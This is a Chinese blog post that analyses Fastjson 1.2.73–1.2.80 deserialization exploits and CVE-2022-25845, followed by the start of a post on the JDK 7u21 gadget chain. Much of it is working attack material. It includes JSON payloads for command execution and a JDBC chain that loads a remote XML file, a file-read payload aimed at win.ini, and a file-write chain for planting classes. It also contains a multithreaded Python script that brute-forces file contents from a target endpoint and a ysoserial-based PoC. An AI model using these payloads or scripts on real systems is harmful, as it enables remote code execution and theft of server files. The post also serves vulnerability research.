恶意类不能是抽象类 恶意类中的getter/setter/static block/constructor能触发恶意操作 修复 1.2.69新增了黑名单可以参考https://github.com/LeadroyaL/fastjson-blacklist\nAutoCloseable就被添加到黑名单了，所以后续去查找Throwable期望类的利用\n1.2.73~1.2.80 1.2.73的改动，允许对任意类型的field进行实例化，增加了攻击面。下面的利用即是通过这个特性\n下图是1.2.67的代码，可以看到是没有field进行实例化，而是直接获取json反序列化的结果\n利用原理 利用思路就在下图，通过**putDeserializer**将这3点地方存入deserializers缓存中，再次@type调用，即可直接获得class，而不会throw了\n参照y4扩展的一个demo\npublic class MyException extends Throwable { private MyClass clazz; public Evil evil; public void setClazz(MyClass clazz) { this.clazz = clazz; } public MyException(try1 trytry) { trytry.tryname=\u0026#34;trytry\u0026#34;; } public MyException() { } } public class MyClass { public String name; } public class try1 { public String tryname; } public class Evil implements AutoCloseable { private String cmd; public void setCmd(String cmd) throws Exception{ this.cmd = cmd; Runtime.getRuntime().exec(this.cmd); } } poc\nd这个地方是用于构造方法的参数类型获取，第一次可以去掉（因为无参和有参构造方法，默认会选择无参\n{ \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Exception\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;MyException\u0026#34;, \u0026#34;trytry\u0026#34;: {}, \u0026#34;clazz\u0026#34;: {}, \u0026#34;evil\u0026#34;: {} }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;MyClass\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;asd\u0026#34; }, \u0026#34;c\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;Evil\u0026#34;, \u0026#34;cmd\u0026#34;: \u0026#34;calc\u0026#34; }, \u0026#34;d\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;try1\u0026#34;, \u0026#34;tryname\u0026#34;: \u0026#34;tttttry\u0026#34; } } 流程的话，直接到Exception获得ThrowableDeserializer并执行deserialze()这里吧\n然后这里会去一个for循环处理json中key的值做对应处理，\n@type则去加载对应类，这里就是MyException 然后是String进行下方判断，不是elseif中字符，则存储到otherValues中，（clazz，evil） 然后otherValues不为空，则会getDeserializer()获取上面的加载的class，而TypeUtils.cast这里就实例化filed，里面执行了putDeserializer（也就是利用思路的关键）\n这里还需要关注下exBeanDeser.getFieldDeserializer(key);这里，MyException只有 有参自构方法时，这里只会获取有参自构方法的参数类型，另外两种则不会获取（另外两种在无参自构时会获取）(下图需要将MyException无参自构方法注释\n跟进里面最后在castToJavaBean()中调用config.getDeserializer()-\u0026gt;putDeserializer()，返回的反序列化加载器还会调用createInstance()进行反序列化，触发static和自构方法code\nputDeserializer()\n只有 有参构造方法的时候，会还原储存对应方法的参数类型\n无构造方法 or 存在无参自构方法时，会还原另外两种情况类型\nwhy public filed 这里要一直追随到fields的初始化，这里只会获取public 添加到list中\ngadget jdbc 依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.80\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.python\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jython\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.postgresql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;postgresql\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;42.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-context\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.28\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 参考的y4\n{ \u0026#34;a\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;java.lang.Exception\u0026#34;, \u0026#34;@type\u0026#34;:\u0026#34;org.python.antlr.ParseException\u0026#34;, \u0026#34;type\u0026#34;:{} }, \u0026#34;b\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;org.python.core.PyObject\u0026#34;, \u0026#34;@type\u0026#34;:\u0026#34;com.ziclix.python.sql.PyConnection\u0026#34;, \u0026#34;connection\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;org.postgresql.jdbc.PgConnection\u0026#34;, \u0026#34;hostSpecs\u0026#34;:[ { \u0026#34;host\u0026#34;:\u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;:2333 } ], \u0026#34;user\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;database\u0026#34;:\u0026#34;test\u0026#34;, \u0026#34;info\u0026#34;:{ \u0026#34;socketFactory\u0026#34;:\u0026#34;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#34;, \u0026#34;socketFactoryArg\u0026#34;:\u0026#34;http://127.0.0.1:8090/exp.xml\u0026#34; }, \u0026#34;url\u0026#34;:\u0026#34;\u0026#34; } } } 这个利用很猛啊\n流程：\nput Exception\n加载ParseException（expectClass：Exception\n触发ParseException#setType \u0026ndash;\u0026gt; put PyObject\n加载PyConnection（expectClass PyObject\n触发PyConnection自构方法 \u0026ndash;\u0026gt; put Connection //这里还没到调用自构方法那不，这里要先对值进行还原即\u0026quot;connection\u0026quot;:{\u0026hellip;}，而这里会先处理connection，所以加载PgConnection时，Connection 为expectClass\n加载PgConnection（expectClass Connection //PGConnection是另一个类，所以这里要利用Connection\n触发PgConnection自购方法 \u0026ndash;\u0026gt; jdbc rce\n那能不能这样构造呢，这样貌似更好理解，理论上是可以的，只是connection这个参数这个值为下面这个的话，PyConnection自购的时候会异常\n{ \u0026ldquo;a\u0026rdquo;:{\u0026hellip; }, \u0026ldquo;b\u0026rdquo;:{\u0026hellip;. \u0026ldquo;connection\u0026rdquo;:{} }, \u0026ldquo;c\u0026rdquo;:{ \u0026ldquo;@type\u0026rdquo;:\u0026ldquo;java.sql.Connection\u0026rdquo;, \u0026ldquo;@type\u0026rdquo;:\u0026ldquo;org.postgresql.jdbc.PgConnection\u0026rdquo;, \u0026hellip; } }\n关于field进行实例化这个特性JavaBeanDeserializer同样存在，初始化完参数后PgConnection调用自购方法，触发jdbc\n修复 https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15 除了黑白名单的变化以外就是直接端掉异常类这条路。\n并且在加类缓存时多了一次autotype判断\nexpectClass和jsonType都需要开启\nCVE-2022-25845 https://github.com/luelueking/CVE-2022-25845-In-Spring\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\n这里用的@1ue师傅的poc，跟议会上的poc构造可能有点差异吧，不过利用点是一样的\n这个利用在1.2.80里我觉得是实用性很好的poc了，这里主要需要3个依赖吧\ncommons-io //用来读写文件 fastjson //不用多说，触发利用 springboot //这个其实是因为会启动时，会生成一个tomcat的临时目录，而TomcatEmbeddedWebappClassLoader加载Class时，会在上述目录对应路径下查找class文件，存在的话就会加载这个class文件触发static块代码执行 所以这三个依赖就造就这个amazing的利用\nput java.io.InputStream 便于后续的调用 因为tomcat这个目录名，并不是固定的，而是随机的，但是在java中file协议可以用来遍历目录所以这里我可以通过file:///tmp找到生成tomcat临时目录的名字 及写入构造好的class文件到tomcat临时目录下，且这个可以解决目录创建的问题 通过fastjson触发class加载，触发static{}执行 //这里fastjson加载类时，会用到TomcatEmbeddedWebappClassLoader加载，所以能加载tomcat临时目录的class。都是环环相扣的利用，挺有意思的 Step1: put java.io.InputStream { \u0026#34;a\u0026#34;: \u0026#34;{ \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;java.lang.Exception\\\u0026#34;, \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.fasterxml.jackson.core.exc.InputCoercionException\\\u0026#34;, \\\u0026#34;p\\\u0026#34;: { } }\u0026#34;, \u0026#34;b\u0026#34;: { \u0026#34;$ref\u0026#34;: \u0026#34;$.a.a\u0026#34; }, \u0026#34;c\u0026#34;: \u0026#34;{ \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.fasterxml.jackson.core.JsonParser\\\u0026#34;, \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\\u0026#34;, \\\u0026#34;in\\\u0026#34;: {}}\u0026#34;, \u0026#34;d\u0026#34;: { \u0026#34;$ref\u0026#34;: \u0026#34;$.c.c\u0026#34; } } 这里解释下poc构造写法吧，可以看到用的是\u0026quot;a\u0026quot;:\u0026quot;...\u0026quot;这种而不是\u0026quot;a\u0026quot;:{...}，为什么这样构造呢（测试两种poc都是能put成功的），感觉是微操(就是不报错，记录日志的时候是正常的，可以看到作者的poc是200，而通常的利用是500（如果明白这个特征找日志就很好定位\n200\n500\n$ref的利用 简述：通过parse.parse()会还原成一个map{String,String},然后parser.handleResovleTask(value);会去查找其中的$ref并进行调用，$.a很好理解就是获取到{\u0026ldquo;a\u0026rdquo;:\u0026quot;\u0026hellip;\u0026ldquo;对应的字符串，而$.a.a就是利用的关键，在寻找时会判断$.a的类型，是String的话会进行JSON.parse()反序列化其值，（正常情况是得到一个map然后再在这个map中获取$.a.{a}{}中这个值(这里是a)。而我们这JSON.parse()会catch（这里相关处理是{}跳过），然后后续处理也没赋上值\u0026ndash;\u0026gt;最后return null。$.a.a即是null，\nso：这里$.a.a可以是$.a.{任何值}，只是用来触发$.a的反序列化\nhandleResovleTask调用$ref\n第一次进入getPropertyValue()，查找$.a，当前currentObject对应整个json{\u0026ldquo;a\u0026rdquo;,\u0026hellip;}(即$)\n第二次进入getPropertyValue()，查找$.a.a，currentObject对应$.a，JSON.parse()触发利用\nStep2：文件读取 getBom() 看这个之前可以先看看这篇，核心利用getBom()\nhttps://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ\n利用需要知道getBom()的返回值，然后浅蓝这里举例了几种可能的场景感觉挺不错的\n一处修改昵称name的功能，通过ref将getBom()的返回值赋予name，然后查看name值，判断读取内容\n同上，但是判断赋值为空时报错，不为空正常，布尔判断了\n没有上述这种好用的name观察点了，通过类型错误导致fastjson报错，根据报错判断，\u0026quot;java.lang.String\u0026quot;{\u0026quot;$ref\u0026quot;:\u0026quot;$.abc.BOM[0]\u0026quot;}，null时不报错，比对成功时返回类型错误报错\n没有任何报错回显时，可以在类型判断后面增加一个dnslog，报错时异常导致后面的dnslog请求不了（但是实战的话感觉很鸡肋）\n不过这种思路在版本探测效果还不错，就是引用几个关键版本点形成的poc进行dnslog请求（具体可以看@su18总结的\n{ \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.io.InputStream\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.BOMInputStream\u0026#34;, \u0026#34;delegate\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.BOMInputStream\u0026#34;, \u0026#34;delegate\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.ReaderInputStream\u0026#34;, \u0026#34;reader\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;jdk.nashorn.api.scripting.URLReader\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;file:///C:/Windows/win.ini\u0026#34; }, \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;bufferSize\u0026#34;: \u0026#34;1024\u0026#34; }, \u0026#34;boms\u0026#34;: [ { \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;bytes\u0026#34;: [59,32,102] } ] }, \u0026#34;boms\u0026#34;: [ { \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;bytes\u0026#34;: [1] } ] }, \u0026#34;b\u0026#34;: {\u0026#34;$ref\u0026#34;:\u0026#34;$.a.delegate\u0026#34;} } 通过爆破比对位数据进行获取的\n在parse.parse()反序列化后，设置Response值时去获取BOM值，触发getBOM()，然后会和in(ReaderInputStream)读取到的值和原本设置的boms进行比对，全部一致则会返回其byte[]，否则返回null\n这也就能通过Response判断文件内容了\n但是其实没必要多套一层啊，本身就能通过$ref触发getBom()，且能返回对应回显\n{ \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.io.InputStream\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.BOMInputStream\u0026#34;, \u0026#34;delegate\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.ReaderInputStream\u0026#34;, \u0026#34;reader\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;jdk.nashorn.api.scripting.URLReader\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;file:///C:/Windows/win.ini\u0026#34;//${file} }, \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;bufferSize\u0026#34;: \u0026#34;1024\u0026#34; }, \u0026#34;boms\u0026#34;: [ { \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;bytes\u0026#34;: [59,32,102]//${data} } ] }, \u0026#34;b\u0026#34;: {\u0026#34;$ref\u0026#34;:\u0026#34;$.a.BOM\u0026#34;} } 因为需要爆破目录，手测有点麻烦，还是让ai写了个脚本\nfrom concurrent.futures import ThreadPoolExecutor import requests import sys session = requests.Session() def send_request(target_url, char_code): boundary = \u0026#34;----WebKitFormBoundaryROOGnnZjMDt56Gw0\u0026#34; headers = { \u0026#34;Host\u0026#34;: \u0026#34;127.0.0.1:8080\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;, \u0026#34;Content-Type\u0026#34;: f\u0026#34;multipart/form-data; boundary={boundary}\u0026#34;, } payload = ( f\u0026#39;--{boundary}\\r\\n\u0026#39; \u0026#39;Content-Disposition: form-data; name=\u0026#34;json\u0026#34;\\r\\n\\r\\n\u0026#39; \u0026#39;{\\n\u0026#39; \u0026#39; \u0026#34;a\u0026#34;: {\\n\u0026#39; \u0026#39; \u0026#34;@type\u0026#34;: \u0026#34;java.io.InputStream\u0026#34;,\\n\u0026#39; \u0026#39; \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.BOMInputStream\u0026#34;,\\n\u0026#39; \u0026#39; \u0026#34;delegate\u0026#34;: {\\n\u0026#39; \u0026#39; \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.ReaderInputStream\u0026#34;,\\n\u0026#39; \u0026#39; \u0026#34;reader\u0026#34;: {\\n\u0026#39; \u0026#39; \u0026#34;@type\u0026#34;: \u0026#34;jdk.nashorn.api.scripting.URLReader\u0026#34;,\\n\u0026#39; f\u0026#39; \u0026#34;url\u0026#34;: \u0026#34;{target_url}\u0026#34;\\n\u0026#39; \u0026#39; },\\n\u0026#39; \u0026#39; \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;,\\n\u0026#39; \u0026#39; \u0026#34;bufferSize\u0026#34;: \u0026#34;1024\u0026#34;\\n\u0026#39; \u0026#39; },\\n\u0026#39; \u0026#39; \u0026#34;boms\u0026#34;: [\\n\u0026#39; \u0026#39; {\\n\u0026#39; \u0026#39; \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;,\\n\u0026#39; f\u0026#39; \u0026#34;bytes\u0026#34;: [{char_code}]\\n\u0026#39; \u0026#39; }\\n\u0026#39; \u0026#39; ]\\n\u0026#39; \u0026#39; },\\n\u0026#39; \u0026#39; \u0026#34;b\u0026#34;: {\u0026#34;$ref\u0026#34;:\u0026#34;$.a.BOM\u0026#34;}\\n\u0026#39; \u0026#39;}\\r\\n\u0026#39; f\u0026#39;--{boundary}--\\r\\n\u0026#39; ) try: response = session.post( \u0026#34;http://127.0.0.1:8080/json\u0026#34;, headers=headers, data=payload, timeout=5 ) return response.text except Exception as e: print(f\u0026#34;Error sending request: {e}\u0026#34;) return None common_codes = list(range(48, 58)) + list(range(65, 91)) + list(range(97, 123)) other_codes = [c for c in range(256) if c not in common_codes] ordered_codes = common_codes + other_codes # 优先常见字符，然后测试其他字符 def brute_force_chars(target_url): valid_chars = \u0026#34;\u0026#34; with ThreadPoolExecutor(max_workers=50) as executor: # 可根据网络情况调整线程数 while True: futures = {} for code in ordered_codes: full_code = valid_chars + str(code) futures[executor.submit(send_request, target_url, full_code)] = code found = False for future in futures: code = futures[future] try: response_text = future.result() if response_text and \u0026#39;\u0026#34;b\u0026#34;:null\u0026#39; not in response_text: valid_chars += str(code) + \u0026#34;,\u0026#34; print(valid_chars) found = True break except: continue if not found: bytes_list = [int(b) for b in valid_chars.split(\u0026#34;,\u0026#34;) if b.strip()] print(\u0026#34;Final result:\u0026#34;, \u0026#34;\u0026#34;.join(chr(b) for b in bytes_list)) exit(0) if __name__ == \u0026#34;__main__\u0026#34;: # if len(sys.argv) != 2: # print(\u0026#34;Usage: python exploit.py \u0026lt;target_url\u0026gt;\u0026#34;) # print(\u0026#34;Example: python exploit.py file:///C:/Windows/win.ini\u0026#34;) # sys.exit(1) # target_url = sys.argv[1] brute_force_chars(\u0026#34;file:///C:/Users\u0026#34;) # brute_force_chars(target_url) 但是在window环境下感觉有点灾难，因为我本地环境下Temp的目录太多了，查看了翻代码希望达到.../Temp/tomcat.*匹配tomcat开头文件（无果）\nStep3: 写入文件 这里我加了几处charsetName，不然我环境会报错缺少charset Name\n{ \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.io.InputStream\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.AutoCloseInputStream\u0026#34;, \u0026#34;in\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.TeeInputStream\u0026#34;, \u0026#34;input\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.CharSequenceInputStream\u0026#34;, \u0026#34;cs\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.String\u0026#34; \u0026#34;1234\u0026#34;,//${shellcode} \u0026#34;charset\u0026#34;: \u0026#34;iso-8859-1\u0026#34;, \u0026#34;bufferSize\u0026#34;: 4 //${size} }, \u0026#34;branch\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.output.WriterOutputStream\u0026#34;, \u0026#34;writer\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.output.LockableFileWriter\u0026#34;, \u0026#34;file\u0026#34;: \u0026#34;./test3\u0026#34;,//${filename} \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;charset\u0026#34;: \u0026#34;iso-8859-1\u0026#34;, \u0026#34;append\u0026#34;: true }, \u0026#34;charsetName\u0026#34;: \u0026#34;UTF-8\u0026#34;, \u0026#34;charset\u0026#34;: \u0026#34;iso-8859-1\u0026#34;, \u0026#34;bufferSize\u0026#34;: 1024, \u0026#34;writeImmediately\u0026#34;: true }, \u0026#34;closeBranch\u0026#34;: true } }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.io.InputStream\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.ReaderInputStream\u0026#34;, \u0026#34;reader\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.XmlStreamReader\u0026#34;, \u0026#34;inputStream\u0026#34;: { \u0026#34;$ref\u0026#34;: \u0026#34;$.a\u0026#34; }, \u0026#34;httpContentType\u0026#34;: \u0026#34;text/xml\u0026#34;, \u0026#34;lenient\u0026#34;: false, \u0026#34;defaultEncoding\u0026#34;: \u0026#34;iso-8859-1\u0026#34; }, \u0026#34;charsetName\u0026#34;: \u0026#34;iso-8859-1\u0026#34;, \u0026#34;bufferSize\u0026#34;: 1024 }, \u0026#34;c\u0026#34;: {} } 利用图\n利用调用如上，细说感觉也描述不出来，然后有几个点要说下\nLockableFileWriter file这里初始化时，会帮我们创建目录，一般情况下tomcat-docbase.xxx这个目录下是没有WEB-INF/classes,这个目录需要我们来创建，而这里LockableFileWriter直接解决了这个问题 poc 中 $ref \u0026#34;@type\u0026#34;: \u0026#34;org.apache.commons.io.input.XmlStreamReader\u0026#34;, \u0026#34;inputStream\u0026#34;: { \u0026#34;$ref\u0026#34;: \u0026#34;$.a\u0026#34; } 在XmlStreamReader初始化时，inputStream可以直接获取到$.a的值，而不不是等到反序列化完，在对$ref的那种调用\n最后一个即是写入文件的坑吧，我本地调试是一次最多写入**15**个字符，后续写入可以追加写入到文件里。但是我看@1ue的poc是20个，但是在我本地环境调试来看是不行的。 会调用2次TeeInputStream#read，第一次是用于写入，第二次是用于返回EOF达到close()文件的效果\n后面发现一次写入过多时，不仅没有字符写入，写入对应的文件也操作不了（怀疑是一直处于open状态了，没close），只能写入新的文件\n调试发现是没有进行close(),后续发现是跟getBOM()这里有关，注意这里的maxBomSize这个值是作为下方for的length。\n接着下图1in.read()这里读取每个值，超过4个值后回到下图2中获取对应的值，每次pos会+1。count则是我们写入字符的长度。这里我们需要进入fill()（里面后续会调用TeeInputStream#read进行close()关闭流）。而这里我们可以发现如果count这里超过**15，图1for走完pos最多为15就会导致进入不了fill()**，导致没有close()\n图1\n图2\n然后就是其实是需要调用两次getBOM()的，而$ref我猜测应该只能调用一次，而XmlStreamReader初始化正好能调用两次getBOM() Step4 加载class 看完感觉这个利用构造，细思极恐。挖掘去这个构造的佬太猛了!^!\nFeature(结论): 摘取于 https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d\n关于getter和setter getter自动调用条件： 方法名长度大于4 非静态方法 以get开头且第四个字母为大写 无参数传入 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong setter自动调用需要满足以下条件： 方法名长度大于4 非静态方法 返回值为void或者当前类 以set开头且第四个字母为大写 参数个数为1个 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数 fastjson 在为类属性寻找getter/setter方法时，调用函数com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_ -字符串 fastjson 在反序列化时，如果Field类型为byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue进行base64解码，在序列化时也会进行base64编码 版本探测 https://github.com/su18/hack-fastjson-1.2.80\n参考：\nhttps://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d\nhttps://www.anquanke.com/post/id/232774#h3-18\nhttps://github.com/luelueking/CVE-2022-25845-In-Spring\nhttps://tttang.com/archive/1579/#toc_1268\nhttps://github.com/LeadroyaL/fastjson-blacklist\nhttps://github.com/su18/hack-fastjson-1.2.80\nhttps://y4er.com/posts/fastjson-1.2.80/\nhttps://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ\n议会\nhttps://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\n","permalink":"https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/","summary":"做个总结，忘了捡得快 1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw","title":"Fastjson1.2.24-1.2.80 反序列化"},{"content":"前言：最近缺少sink点，看看前辈们是怎么利用原生链的\n然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度\njdk8u20主要是根据参考种跳跳糖那篇文章，学习的。有点难度的。思路到不难，就是最后那个报错的完全理解什么原因以及怎么处理！感觉参考文章那个点不是很清楚，于是根据自己的理解又去琢磨琢磨了那个点\njdk7u21 简短概述下吧，利用AnnotationInvocationHandler#invoke方法中动态代理 调用的方法为equals时对应if选项里代码，其会通过(for循环反射调用)去调用type属性的所有方法（这里也就设置type为Templates.class，然后调用的对象为equals(obj)的参数，所以这里obj是TemplatesImpl即可进行利用）\n然后还有个难点是hash的判断，利用map的equals，都需要构造一个hash相等的东西（这里7u21作者的设计还挺有意思的）那就一起简单看看吧\n调用链\nLinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() 这里其实到Proxy(Templates).equals()前都是为了进入equals这步if，前面都是为了hash相等的构造（也就是核心sink利用步骤只有后面这段）\npoc poc是直接用的ysoserial的\nimport ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.Jdk7u21; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class jdk7u21_poc { public static void main(String[] args) throws Exception { Object templates = Gadgets.createTemplatesImpl(\u0026#34;calc\u0026#34;); String zeroHashCodeStr = \u0026#34;f5a5a608\u0026#34;; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \u0026#34;foo\u0026#34;); InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \u0026#34;type\u0026#34;, Templates.class); Templates proxy = (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, \u0026#34;_auxClasses\u0026#34;, (Object)null); Reflections.setFieldValue(templates, \u0026#34;_class\u0026#34;, (Object)null); map.put(zeroHashCodeStr, templates); byte[] ser = Serializer.serialize(set); Deserializer.deserialize(ser); } } hash 链子整体没啥讲的，很简单。主要是hash那\n主要要满足两次进入put时，hash要一样，且第一次设置的key(就是第二次的k)得是TemplatesImpl（因为这个是作为最后invoke的object进行调用的）也就是说proxyput调用前，得有一个存储值key得是TemplatesImpl且hash要和proxy计算出的hash相同\npublic class HashSet\u0026lt;E\u0026gt;{ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { for (int i=0; i\u0026lt;size; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } 然后这里TemplatesImpl的hashcode()调用是直接调用Object的hashcode()\n而proxy的hashcode()这里则是有对应的处理方式（这里其实可以控制返回0，但是TemplatesImpl的hashcode()不可能为0，所以不能这样构造\nprivate int hashCodeImpl() { int var1 = 0; Map.Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Map.Entry)var2.next(); } return var1; } this.memberValues可以初始化设置，可以看到返回的是var1\nvar1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) private static int memberValueHashCode(Object var0) { Class var1 = var0.getClass(); if (!var1.isArray()) { return var0.hashCode(); 然后7u21的作者是爆破了一个((String)var3.getKey()).hashCode()的值为**0**的数(\u0026quot;f5a5a608\u0026quot;)\n然后再让var3.getValue()为第一次存储的TemplatesImpl为同一个对象，即可实现和第一次的hash值相等\n巧的点就在这hhh，我第一反义肯定想不到一个有值的String.hashcode()的值会为0！！\n[*] String hashcode \u0026amp; 整形溢出 然后就好奇呀，就去看代码了，发现是溢出导致的负数从而导致可以得到0这个值hhh，挺有意思的，第一次直观感受到整形溢出的利用\n然后写了个小demo，感觉挺有意思的\npublic class hashtest { public static void main(String[] args) throws Exception { System.out.println(Integer.MAX_VALUE); // 输出 2147483647 System.out.println(Integer.MIN_VALUE); System.out.println(2147483647*100); System.out.println(2147483647*2); System.out.println(2147483647+1); System.out.println(-2147483648-1); System.out.println(-2147483648*3); System.out.println(2147483647*3); System.out.println(\u0026#34;\u0026#34;.hashCode()); } } 输出 2147483647 -2147483648 -100 -2 -2147483648 2147483647 -2147483648 2147483645 0 然后对int的值域的理解，其实类似一个环形（最小值连接着最大值，min-1=max，max+1=min）\n这里简单解释下-2147483648*2 = 0 ，2147483647*2 = -2\n这里其实就是二进制下右移一步\n-2147483648是10000000 00000000 00000000 00000000右移后直接00000000 00000000 00000000 00000000也就为0了\n2147483647是01111111 11111111 11111111 11111111右移后11111111 11111111 11111111 11111110，这里开头是1要采用补码机制，即为-号，然后取反再+1\n取反00000000 00000000 00000000 00000001+1得00000000 00000000 00000000 00000010然后符号\n所以为-2hh，都快忘了hh 